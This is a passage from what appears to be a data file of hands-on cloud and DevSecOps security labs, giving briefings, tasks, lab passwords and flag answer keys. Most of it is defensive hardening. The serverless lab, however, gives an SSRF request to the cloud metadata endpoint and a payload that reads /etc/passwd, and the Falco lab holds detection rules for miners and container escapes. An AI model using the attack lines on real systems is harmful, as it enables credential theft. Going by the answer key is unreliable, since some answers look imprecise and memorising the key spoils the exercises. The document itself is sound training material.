- Credentials: registry-admin / reg-sec-2024!

### Tasks
1. Scan a Docker image with Trivy for known CVEs
2. Analyze scan results and identify critical/high vulnerabilities
3. Implement image signing using Sigstore Cosign
4. Verify image signatures before deployment
5. Configure registry with TLS and basic authentication
6. Implement image pull secrets for Kubernetes deployments
7. Set up automated scanning in a CI/CD pipeline
8. Create an admission controller policy to block unsigned images

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan a Docker image with Trivy for known CVEs", "Analyze scan results and identify critical/high vulnerabilities", "Implement image signing using Sigstore Cosign", "Verify image signatures before deployment", "Configure registry with TLS and basic authentication", "Implement image pull secrets for Kubernetes deployments", "Set up automated scanning in a CI/CD pipeline", "Create an admission controller policy to block unsigned images"],
    credentials: [
      { service: "container", username: "registry-admin", password: "reg-sec-2024!"}
    ],
    flags: [
      { title: "Trivy Scanner", description: "Scan image for CVEs", correctAnswer: "trivy image --severity HIGH,CRITICAL nginx:latest", points: 150},
      { title: "Image Signer", description: "Sign image with Cosign", correctAnswer: "cosign sign --key cosign.key registry/image:tag", points: 200},
      { title: "Sig Verifier", description: "Verify image signature", correctAnswer: "cosign verify --key cosign.pub registry/image:tag", points: 200},
      { title: "Registry Hardener", description: "Configure registry TLS", correctAnswer: "docker run -d -p 5000:5000 --name registry -v /certs:/certs registry:2", points: 200},
      { title: "Policy Enforcer", description: "Block unsigned images in K8s", correctAnswer: "kubectl apply -f admission-policy.yaml", points: 200}
    ],
  },
  {
    title: "Terraform Security & IaC Scanning",
    description: "Identify and remediate security misconfigurations in Terraform infrastructure code.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Scan Terraform code for misconfigurations, implement security policies, and enforce infrastructure standards.

### Environment
- Ubuntu 22.04 with Terraform and tfsec
- Checkov for IaC scanning
- Credentials: tfadmin / tf-sec-2024!

### Tasks
1. Scan Terraform code with tfsec for security issues
2. Use Checkov to identify non-compliant infrastructure patterns
3. Remediate findings for public S3 buckets and open security groups
4. Implement Sentinel policies for Terraform Cloud enforcement
5. Enable state file encryption and remote backend with locking
6. Create custom OPA (Open Policy Agent) Rego policies for Terraform
7. Implement drift detection to identify unauthorized changes
8. Set up pre-commit hooks for automated IaC security scanning

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan Terraform code with tfsec for security issues", "Use Checkov to identify non-compliant infrastructure patterns", "Remediate findings for public S3 buckets and open security groups", "Implement Sentinel policies for Terraform Cloud enforcement", "Enable state file encryption and remote backend with locking", "Create custom OPA (Open Policy Agent) Rego policies for Terraform", "Implement drift detection to identify unauthorized changes", "Set up pre-commit hooks for automated IaC security scanning"],
    credentials: [
      { service: "container", username: "tfadmin", password: "tf-sec-2024!"}
    ],
    flags: [
      { title: "TFSec Scanner", description: "Scan Terraform with tfsec", correctAnswer: "tfsec --format json .", points: 150},
      { title: "Checkov Runner", description: "Scan with Checkov", correctAnswer: "checkov -d . --framework terraform", points: 150},
      { title: "S3 Fixer", description: "Remediate public S3 bucket", correctAnswer: "s3_bucket {acl = private}", points: 200},
      { title: "Sentinel Enforcer", description: "Apply Sentinel policy", correctAnswer: "sentinel apply -canvas policy.sentinel.hcl", points: 200},
      { title: "Drift Detector", description: "Detect infrastructure drift", correctAnswer: "terraform plan -detailed-exitcode", points: 200}
    ],
  },
  {
    title: "Kubernetes Security Hardening",
    description: "Harden Kubernetes clusters against common attack vectors and misconfigurations.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Implement Pod Security Standards, network policies, RBAC, and secrets management in Kubernetes.

### Environment
- Ubuntu 22.04 with kubectl and kind
- Minikube or kind cluster
- Credentials: k8s-admin / k8s-sec-2024!

### Tasks
1. Analyze RBAC permissions and identify overly permissive roles
2. Create NetworkPolicies to isolate pods and restrict traffic
3. Implement Pod Security Standards (Restricted profile)
4. Configure secrets encryption at rest in etcd
5. Deploy Falco for runtime threat detection
6. Harden kubelet and API server configurations
7. Implement admission controllers (OPA Gatekeeper)
8. Audit cluster with kube-bench for CIS benchmark compliance

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Analyze RBAC permissions and identify overly permissive roles", "Create NetworkPolicies to isolate pods and restrict traffic", "Implement Pod Security Standards (Restricted profile)", "Configure secrets encryption at rest in etcd", "Deploy Falco for runtime threat detection", "Harden kubelet and API server configurations", "Implement admission controllers (OPA Gatekeeper)", "Audit cluster with kube-bench for CIS benchmark compliance"],
    credentials: [
      { service: "container", username: "k8s-admin", password: "k8s-sec-2024!"}
    ],
    flags: [
      { title: "RBAC Auditor", description: "Identify permissive ClusterRoles", correctAnswer: "kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects==null)'", points: 200},
      { title: "Network Isolator", description: "Create deny-all NetworkPolicy", correctAnswer: "kubectl apply -f network-policy-deny-all.yaml", points: 200},
      { title: "PSS Enforcer", description: "Apply Pod Security Standards", correctAnswer: "kubectl label namespace default pod-security.kubernetes.io/enforce=restricted", points: 200},
      { title: "Secrets Encryptor", description: "Enable etcd encryption", correctAnswer: "EncryptionConfiguration with aescbc provider", points: 200},
      { title: "CIS Benchmarker", description: "Run kube-bench security audit", correctAnswer: "kube-bench run --targets master", points: 200}
    ],
  },
  {
    title: "Serverless Security Testing",
    description: "Test and secure serverless functions (AWS Lambda, Azure Functions) from common vulnerabilities.",
    dockerImage: "node:20-alpine",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify and exploit vulnerabilities in serverless functions including injection, SSRF, and over-privileged roles.

### Environment
- Node.js runtime for function development
- AWS SAM CLI or equivalent
- Credentials: lambda-dev / sls-sec-2024!

### Tasks
1. Analyze Lambda execution roles for excessive IAM permissions
2. Exploit environment variable injection to steal secrets
3. Perform SSRF through a vulnerable Lambda function
4. Test event injection for Lambda triggered by API Gateway
5. Exploit deserialization vulnerabilities in Lambda handlers
6. Chain Lambda exploitation with S3 bucket misconfigurations
7. Implement Lambda function-level firewalling
8. Audit Lambda layers for injected malicious code

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Analyze Lambda execution roles for excessive IAM permissions", "Exploit environment variable injection to steal secrets", "Perform SSRF through a vulnerable Lambda function", "Test event injection for Lambda triggered by API Gateway", "Exploit deserialization vulnerabilities in Lambda handlers", "Chain Lambda exploitation with S3 bucket misconfigurations", "Implement Lambda function-level firewalling", "Audit Lambda layers for injected malicious code"],
    credentials: [
      { service: "container", username: "lambda-dev", password: "sls-sec-2024!"}
    ],
    flags: [
      { title: "Role Analyzer", description: "Audit Lambda execution role", correctAnswer: "aws iam get-role --role-name lambda-execution-role --query 'Role.AssumeRolePolicyDocument'", points: 150},
      { title: "Env Injector", description: "Exploit environment variable injection", correctAnswer: "aws lambda update-function-configuration --function-name vuln-func --environment Variables={MALICIOUS=true}", points: 200},
      { title: "SSRF Exploiter", description: "SSRF through Lambda", correctAnswer: "curl -X POST https://api.example.com/proxy --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'", points: 250},
      { title: "Event Poisoner", description: "Inject malicious event payload", correctAnswer: "{source: malicious, detail: {command: 'cat /etc/passwd'}}", points: 200},
      { title: "Layer Auditor", description: "Scan Lambda layers for risks", correctAnswer: "aws lambda get-layer-version-by-arn --arn arn:aws:lambda:REGION:ACCOUNT:layer:my-layer:1", points: 200}
    ],
  },
  {
    title: "Cloud Storage Security Audit",
    description: "Audit and secure cloud storage buckets (S3, GCS, Azure Blob) against public exposure.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify publicly accessible storage buckets, misconfigured ACLs, and implement encryption at rest.

### Environment
- Ubuntu 22.04 with cloud CLI tools
- CloudSploit for scanning
- Credentials: cloud-auditor / storage-sec-2024!

### Tasks
1. Enumerate all S3 buckets and their public access settings
2. Identify buckets with public read or write ACLs
3. Test bucket policies for overly permissive conditions
4. Enable default encryption (SSE-S3 or SSE-KMS) on all buckets
5. Implement bucket access logging for audit trails
6. Configure pre-signed URL expiration policies
7. Use Macie to detect sensitive data in S3 buckets
8. Create S3 Block Public Access at the account level

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate all S3 buckets and their public access settings", "Identify buckets with public read or write ACLs", "Test bucket policies for overly permissive conditions", "Enable default encryption (SSE-S3 or SSE-KMS) on all buckets", "Implement bucket access logging for audit trails", "Configure pre-signed URL expiration policies", "Use Macie to detect sensitive data in S3 buckets", "Create S3 Block Public Access at the account level"],
    credentials: [
      { service: "container", username: "cloud-auditor", password: "storage-sec-2024!"}
    ],
    flags: [
      { title: "Bucket Lister", description: "List all S3 buckets", correctAnswer: "aws s3api list-buckets --query 'Buckets[].Name'", points: 100},
      { title: "Public Checker", description: "Check public access settings", correctAnswer: "aws s3api get-public-access-block --bucket target-bucket", points: 150},
      { title: "Policy Analyzer", description: "Analyze bucket policy", correctAnswer: "aws s3api get-bucket-policy --bucket target-bucket --output text | jq '.Policy'", points: 200},
      { title: "Encryptor", description: "Enable default encryption", correctAnswer: "aws s3api put-bucket-encryption --bucket target-bucket --server-side-encryption-configuration '{Rules:[{ApplyServerSideEncryptionByDefault:{SSEAlgorithm:aws:kms}}]}'", points: 200},
      { title: "Macie Scanner", description: "Scan for sensitive data", correctAnswer: "aws macie2 create-classification-job --job-type ONE_TIME", points: 250}
    ],
  },
  {
    title: "Secrets Management with HashiCorp Vault",
    description: "Deploy and configure HashiCorp Vault for centralized secrets management.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1250,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Implement dynamic secrets, encryption as a service, and secure audit logging with HashiCorp Vault.

### Environment
- Ubuntu 22.04 with Vault binary
- Dev mode and production configuration
- Credentials: vault-admin / vault-sec-2024!

### Tasks
1. Initialize and unseal a Vault server in development mode
2. Enable and configure the KV secrets engine v2
3. Create policies for least-privilege secret access
4. Enable the database secrets engine for dynamic MySQL credentials
5. Configure transit secrets engine for encryption as a service
6. Enable audit logging to a file for compliance
7. Set up AppRole authentication for application access
8. Implement auto-unseal with cloud KMS

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Initialize and unseal a Vault server in development mode", "Enable and configure the KV secrets engine v2", "Create policies for least-privilege secret access", "Enable the database secrets engine for dynamic MySQL credentials", "Configure transit secrets engine for encryption as a service", "Enable audit logging to a file for compliance", "Set up AppRole authentication for application access", "Implement auto-unseal with cloud KMS"],
    credentials: [
      { service: "container", username: "vault-admin", password: "vault-sec-2024!"}
    ],
    flags: [
      { title: "Vault Initializer", description: "Initialize Vault server", correctAnswer: "vault operator init -key-shares=1 -key-threshold=1", points: 150},
      { title: "Policy Creator", description: "Create access policy", correctAnswer: "vault policy write app-read", points: 200},
      { title: "Dynamic Secrets", description: "Enable database secrets engine", correctAnswer: "vault secrets enable database", points: 250},
      { title: "Transit Encryptor", description: "Encrypt data with transit engine", correctAnswer: "vault write transit/encrypt/my-key plaintext=$(echo -n 'secret' | base64)", points: 200},
      { title: "AppRole Configurer", description: "Configure AppRole auth", correctAnswer: "vault auth enable approle && vault write auth/approle/role/my-role token_policies=app-read", points: 200}
    ],
  },
  {
    title: "Cloud Network Security (VPC/Firewall Rules)",
    description: "Design and implement secure VPC configurations with proper firewall rules and network segmentation.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Create VPC with public/private subnets, configure security groups, and implement network ACLs.

### Environment
- Ubuntu 22.04 with Terraform or cloud CLI
- VPC simulation environment
- Credentials: net-admin / vpc-sec-2024!

### Tasks
1. Design a VPC with public and private subnets across multiple AZs
2. Configure security groups with minimum required ports
3. Implement NACLs for stateless traffic filtering
4. Set up NAT Gateway for private subnet outbound access
5. Configure VPC Flow Logs for traffic monitoring
6. Implement VPC Peering with another VPC for cross-account access
7. Create VPN endpoint for secure private connectivity
8. Audit VPC configuration against CIS benchmarks

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Design a VPC with public and private subnets across multiple AZs", "Configure security groups with minimum required ports", "Implement NACLs for stateless traffic filtering", "Set up NAT Gateway for private subnet outbound access", "Configure VPC Flow Logs for traffic monitoring", "Implement VPC Peering with another VPC for cross-account access", "Create VPN endpoint for secure private connectivity", "Audit VPC configuration against CIS benchmarks"],
    credentials: [
      { service: "container", username: "net-admin", password: "vpc-sec-2024!"}
    ],
    flags: [
      { title: "VPC Designer", description: "Create VPC with subnets", correctAnswer: "aws ec2 create-vpc --cidr-block 10.0.0.0/16", points: 150},
      { title: "SG Hardener", description: "Configure restrictive security group", correctAnswer: "aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 443", points: 200},
      { title: "NACL Creator", description: "Create network ACL", correctAnswer: "aws ec2 create-network-acl --vpc-id vpc-xxx", points: 200},
      { title: "Flow Logger", description: "Enable VPC Flow Logs", correctAnswer: "aws ec2 create-flow-logs --resource-type VPC --resource-ids vpc-xxx --traffic-type ALL", points: 200},
      { title: "Peering Connector", description: "Create VPC peering connection", correctAnswer: "aws ec2 create-vpc-peering-connection --vpc-id vpc-xxx --peer-vpc-id vpc-yyy", points: 200}
    ],
  },
  {
    title: "Multi-Cloud Identity Federation",
    description: "Configure identity federation across AWS, Azure, and GCP for unified access management.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1400,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Implement SAML-based identity federation, configure cross-cloud role mapping, and enforce MFA policies.

### Environment
- Ubuntu 22.04 with cloud CLIs
- SAML testing tools
- Credentials: id-federation / idp-sec-2024!

### Tasks
1. Set up an identity provider (IdP) with SAML 2.0 support
2. Configure AWS IAM Identity Center for federated access
3. Map Azure AD groups to AWS IAM roles via SAML
4. Implement GCP Workload Identity Federation for keyless auth
5. Enforce MFA requirements for all federated users
6. Implement conditional access policies based on device compliance
7. Audit federation configuration for security weaknesses
8. Test single sign-on across all three cloud platforms

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Set up an identity provider (IdP) with SAML 2.0 support", "Configure AWS IAM Identity Center for federated access", "Map Azure AD groups to AWS IAM roles via SAML", "Implement GCP Workload Identity Federation for keyless auth", "Enforce MFA requirements for all federated users", "Implement conditional access policies based on device compliance", "Audit federation configuration for security weaknesses", "Test single sign-on across all three cloud platforms"],
    credentials: [
      { service: "container", username: "id-federation", password: "idp-sec-2024!"}
    ],
    flags: [
      { title: "IdP Configurer", description: "Set up SAML identity provider", correctAnswer: "aws iam create-saml-provider --name MyIdP --saml-metadata-document file://metadata.xml", points: 200},
      { title: "Role Mapper", description: "Map Azure AD group to IAM role", correctAnswer: "aws iam create-role --role-name FederatedRole --assume-role-policy-document '{Statement:[{Effect:Allow,Principal:{Federated:arn:aws:iam::ACCOUNT:saml-provider/MyIdP},Action:sts:AssumeRoleWithSAML}]}'", points: 250},
      { title: "Workload Identity", description: "Configure GCP Workload Identity", correctAnswer: "gcloud iam workload-identity-pools create my-pool --location global", points: 200},
      { title: "MFA Enforcer", description: "Enforce MFA for federation", correctAnswer: "aws iam put-user-policy --user-name federated-user --policy-name RequireMFA", points: 250},
      { title: "SSO Tester", description: "Test federated SSO login", correctAnswer: "aws sts assume-role-with-saml --role-arn arn:aws:iam::ACCOUNT:role/FederatedRole", points: 200}
    ],
  },
  {
    title: "Git Repository Security & Secret Scanning",
    description: "Detect and remediate secrets accidentally committed to Git repositories.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Use git-secrets, truffleHog, and GitLeaks to scan for secrets and implement pre-commit hooks.

### Environment
- Ubuntu 22.04 with git
- truffleHog, GitLeaks, git-secrets
- Credentials: dev / git-sec-2024!

### Tasks
1. Scan repository history for leaked secrets using truffleHog
2. Use GitLeaks to detect hardcoded API keys and passwords
3. Install git-secrets pre-commit hook to prevent future leaks
4. Remove secrets from Git history using git filter-branch or BFG
5. Audit .git/config and .env files for sensitive data
6. Implement repository access controls and branch protection
7. Configure GitHub secret scanning push protection
8. Create a secrets incident response runbook

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan repository history for leaked secrets using truffleHog", "Use GitLeaks to detect hardcoded API keys and passwords", "Install git-secrets pre-commit hook to prevent future leaks", "Remove secrets from Git history using git filter-branch or BFG", "Audit .git/config and .env files for sensitive data", "Implement repository access controls and branch protection", "Configure GitHub secret scanning push protection", "Create a secrets incident response runbook"],
    credentials: [
      { service: "container", username: "dev", password: "git-sec-2024!"}
    ],
    flags: [
      { title: "TruffleHog Scanner", description: "Scan repo for secrets", correctAnswer: "trufflehog git file://./repo --only-verified", points: 150},
      { title: "GitLeaks Runner", description: "Detect hardcoded secrets", correctAnswer: "gitleaks detect --source . --verbose", points: 150},
      { title: "Pre-commit Installer", description: "Install git-secrets hook", correctAnswer: "git secrets --install && git secrets --register-aws", points: 100},
      { title: "History Cleaner", description: "Remove secrets from history", correctAnswer: "bfg --replace-text passwords.txt repo.git", points: 250},
      { title: "Branch Protector", description: "Enable branch protection rules", correctAnswer: "gh api repos/OWNER/REPO/branches/main/protection -X PUT", points: 200}
    ],
  },
  {
    title: "CI/CD Pipeline Security",
    description: "Secure CI/CD pipelines against injection, credential theft, and supply chain attacks.",
    dockerImage: "node:20-alpine",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Harden GitHub Actions, implement signed commits, and secure artifact integrity in CI/CD workflows.

### Environment
- Node.js 20 Alpine with GitHub Actions runner
- CI/CD security tools
- Credentials: ci-admin / cicd-sec-2024!

### Tasks
1. Audit GitHub Actions workflows for injection vulnerabilities
2. Implement pinned action versions (SHA pins) to prevent supply chain attacks
3. Configure OIDC for cloud deployments without long-lived credentials
4. Scan container images in CI before pushing to registry
5. Implement signed commits and artifact attestation with SLSA
6. Secure secrets in GitHub Actions using environment protection rules
7. Audit npm/yarn lock files for vulnerable dependencies
8. Implement rollback mechanisms for failed deployments

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Audit GitHub Actions workflows for injection vulnerabilities", "Implement pinned action versions (SHA pins) to prevent supply chain attacks", "Configure OIDC for cloud deployments without long-lived credentials", "Scan container images in CI before pushing to registry", "Implement signed commits and artifact attestation with SLSA", "Secure secrets in GitHub Actions using environment protection rules", "Audit npm/yarn lock files for vulnerable dependencies", "Implement rollback mechanisms for failed deployments"],
    credentials: [
      { service: "container", username: "ci-admin", password: "cicd-sec-2024!"}
    ],
    flags: [
      { title: "Workflow Auditor", description: "Audit Actions for injection", correctAnswer: "grep -r '${{' .github/workflows/", points: 150},
      { title: "SHA Pinner", description: "Pin actions to SHA", correctAnswer: "uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11", points: 150},
      { title: "OIDC Configurer", description: "Configure OIDC for cloud deploy", correctAnswer: "permissions: id-token: write", points: 200},
      { title: "Image Scanner", description: "Scan container in CI", correctAnswer: "trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest", points: 200},
      { title: "Attestation Creator", description: "Create SLSA attestation", correctAnswer: "slsa-github-generator provenance --subject myapp:latest", points: 200}
    ],
  },
  {
    title: "Infrastructure as Code Security Scanning",
    description: "Scan CloudFormation, Terraform, and Ansible for security misconfigurations.",
    dockerImage: "ubuntu:22.04",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Implement automated IaC security scanning in CI/CD with custom policies and remediation.

### Environment
- Ubuntu 22.04 with cfn-nag, tfsec, ansible-lint
- Multiple IaC templates
- Credentials: iac-admin / iac-sec-2024!

### Tasks
1. Scan CloudFormation templates with cfn-nag
2. Run tfsec on Terraform modules for security findings
3. Use ansible-lint to enforce Ansible playbook security
4. Create custom checkov policies for organizational requirements
5. Implement IaC scanning as a pre-deploy gate in CI/CD
6. Remediate top 10 most common IaC misconfigurations
7. Generate compliance reports from IaC scans
8. Integrate scanning results with Jira for tracking

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan CloudFormation templates with cfn-nag", "Run tfsec on Terraform modules for security findings", "Use ansible-lint to enforce Ansible playbook security", "Create custom checkov policies for organizational requirements", "Implement IaC scanning as a pre-deploy gate in CI/CD", "Remediate top 10 most common IaC misconfigurations", "Generate compliance reports from IaC scans", "Integrate scanning results with Jira for tracking"],
    credentials: [
      { service: "container", username: "iac-admin", password: "iac-sec-2024!"}
    ],
    flags: [
      { title: "CFN Nag Runner", description: "Scan CloudFormation with cfn-nag", correctAnswer: "cfn_nag_scan --input-path templates/", points: 150},
      { title: "TFSec Scanner", description: "Scan Terraform with tfsec", correctAnswer: "tfsec terraform/ --format json", points: 150},
      { title: "Ansible Linter", description: "Lint Ansible playbooks", correctAnswer: "ansible-lint playbooks/ --strict", points: 150},
      { title: "Custom Policy Writer", description: "Create checkov custom policy", correctAnswer: "checkov -d . --custom-check-file custom_policy.py", points: 200},
      { title: "Compliance Reporter", description: "Generate compliance report", correctAnswer: "tfsec terraform/ --format json --out report.json", points: 200}
    ],
  },
  {
    title: "Container Runtime Security with Falco",
    description: "Deploy Falco for real-time threat detection in container environments.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Configure Falco rules, detect container escapes, and integrate with alerting systems.

### Environment
- Ubuntu 22.04 with Falco
- Docker runtime for testing
- Credentials: falco-admin / falco-sec-2024!

### Tasks
1. Install and configure Falco for container monitoring
2. Write custom Falco rules to detect suspicious file access
3. Detect container breakout attempts through syscall monitoring
4. Monitor for cryptocurrency mining process execution
5. Alert on unauthorized network connections from containers
6. Integrate Falco alerts with Slack or PagerDuty
7. Analyze Falco output for false positive reduction
8. Implement response actions using Falco sidekick

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Install and configure Falco for container monitoring", "Write custom Falco rules to detect suspicious file access", "Detect container breakout attempts through syscall monitoring", "Monitor for cryptocurrency mining process execution", "Alert on unauthorized network connections from containers", "Integrate Falco alerts with Slack or PagerDuty", "Analyze Falco output for false positive reduction", "Implement response actions using Falco sidekick"],
    credentials: [
      { service: "container", username: "falco-admin", password: "falco-sec-2024!"}
    ],
    flags: [
      { title: "Falco Installer", description: "Install Falco", correctAnswer: "curl -fsSL https://falco.org/repo/falco.key | gpg --dearmor", points: 100},
      { title: "Rule Writer", description: "Create custom Falco rule", correctAnswer: "- rule: Detect Crypto Mining condition: spawned_process and proc.name in (xmrig, minerd)", points: 200},
      { title: "Breakout Detector", description: "Detect container escape", correctAnswer: "- rule: Container Escape Attempt condition: evt.type=clone and evt.arg.flags contains CLONE_NEWUSER", points: 250},
      { title: "Network Monitor", description: "Alert on unauthorized connections", correctAnswer: "- rule: Unexpected Outbound Connection condition: outbound and not proc.name in (allowed_bins)", points: 200},
      { title: "Alert Integrator", description: "Integrate with Slack", correctAnswer: "falcosidekick --slack.webhookurl https://hooks.slack.com/xxx", points: 150}
    ],
  },
  {
    title: "Artifact Signing & SBOM Generation",
    description: "Implement artifact signing with Sigstore and generate Software Bill of Materials.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Sign binaries, containers, and Helm charts; generate SBOMs for supply chain transparency.

### Environment
- Ubuntu 22.04 with Cosign, Syft, and Grype
- Helm for chart signing
- Credentials: signer / artifact-sec-2024!

### Tasks
1. Generate a key pair for artifact signing with Cosign
2. Sign a container image and verify its signature
3. Create an SBOM using Syft for a Docker image
4. Scan SBOM for vulnerabilities with Grype
5. Sign Helm charts before publishing to a registry
6. Implement keyless signing with Sigstore Rekor
7. Verify artifact provenance using SLSA framework
8. Configure Sigstore transparency log for audit trails

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Generate a key pair for artifact signing with Cosign", "Sign a container image and verify its signature", "Create an SBOM using Syft for a Docker image", "Scan SBOM for vulnerabilities with Grype", "Sign Helm charts before publishing to a registry", "Implement keyless signing with Sigstore Rekor", "Verify artifact provenance using SLSA framework", "Configure Sigstore transparency log for audit trails"],
    credentials: [
      { service: "container", username: "signer", password: "artifact-sec-2024!"}
    ],
    flags: [
      { title: "Key Generator", description: "Generate signing key pair", correctAnswer: "cosign generate-key-pair", points: 100},
      { title: "Image Signer", description: "Sign container image", correctAnswer: "cosign sign --key cosign.key registry/image:tag", points: 200},
      { title: "SBOM Creator", description: "Generate SBOM with Syft", correctAnswer: "syft packages docker:myimage:latest -o spdx-json > sbom.json", points: 200},
      { title: "Vuln Scanner", description: "Scan SBOM for vulnerabilities", correctAnswer: "grype sbom:./sbom.json --fail-on high", points: 200},
      { title: "Keyless Signer", description: "Keyless signing with Rekor", correctAnswer: "cosign sign --yes registry/image:tag", points: 200}
    ],
  },
  {
    title: "Secrets Rotation & Credential Management",
    description: "Implement automated secrets rotation for databases, API keys, and certificates.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Design secrets rotation workflows with zero-downtime and implement dynamic credential generation.

### Environment
- Ubuntu 22.04 with Vault and AWS CLI
- Database for credential rotation
- Credentials: secrets-admin / rotate-sec-2024!

### Tasks
1. Implement automated password rotation for PostgreSQL users
2. Rotate AWS access keys with zero-downtime for applications
3. Configure Vault dynamic database credentials with TTL
4. Set up certificate auto-renewal with cert-manager
5. Implement secrets synchronization across multiple environments
6. Create rotation schedules with cron-based automation
7. Test credential rotation without breaking running applications
8. Audit rotated credentials for proper cleanup

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Implement automated password rotation for PostgreSQL users", "Rotate AWS access keys with zero-downtime for applications", "Configure Vault dynamic database credentials with TTL", "Set up certificate auto-renewal with cert-manager", "Implement secrets synchronization across multiple environments", "Create rotation schedules with cron-based automation", "Test credential rotation without breaking running applications", "Audit rotated credentials for proper cleanup"],
    credentials: [
      { service: "container", username: "secrets-admin", password: "rotate-sec-2024!"}
    ],
    flags: [
      { title: "DB Rotator", description: "Rotate PostgreSQL password", correctAnswer: "ALTER USER app_user WITH PASSWORD 'new-secure-password';", points: 200},
      { title: "Key Rotator", description: "Rotate AWS access key", correctAnswer: "aws iam create-access-key --user-name app-user && aws iam delete-access-key --user-name app-user --access-key-id OLD_KEY", points: 200},
      { title: "Dynamic Creds", description: "Generate dynamic DB credentials", correctAnswer: "vault read database/creds/readonly-role", points: 200},
      { title: "Cert Renewer", description: "Auto-renew TLS certificate", correctAnswer: "kubectl annotate certificate mycert cert-manager.io/renew-before=720h", points: 200},
      { title: "Rotation Scheduler", description: "Schedule credential rotation", correctAnswer: "echo '0 0 1 * * /scripts/rotate-creds.sh' | crontab -", points: 150}
    ],
  },
  {
    title: "GitOps Security with ArgoCD",
    description: "Secure GitOps workflows using ArgoCD with RBAC, SSO, and policy enforcement.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Harden ArgoCD deployments with RBAC policies, SSO integration, and sync validation.

### Environment
- Ubuntu 22.04 with ArgoCD CLI
- Kubernetes cluster with ArgoCD
- Credentials: argo-admin / gitops-sec-2024!

### Tasks
1. Configure ArgoCD RBAC with project-level restrictions
2. Enable SSO integration for ArgoCD authentication
3. Implement sync windows to prevent unauthorized deployments
4. Configure resource hooks for pre/post-deploy validation
5. Enable signature verification for Git repositories
6. Set up notifications for deployment events
7. Implement ApplicationSets for multi-cluster management
8. Audit ArgoCD audit logs for compliance

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure ArgoCD RBAC with project-level restrictions", "Enable SSO integration for ArgoCD authentication", "Implement sync windows to prevent unauthorized deployments", "Configure resource hooks for pre/post-deploy validation", "Enable signature verification for Git repositories", "Set up notifications for deployment events", "Implement ApplicationSets for multi-cluster management", "Audit ArgoCD audit logs for compliance"],
    credentials: [
      { service: "container", username: "argo-admin", password: "gitops-sec-2024!"}
    ],
    flags: [
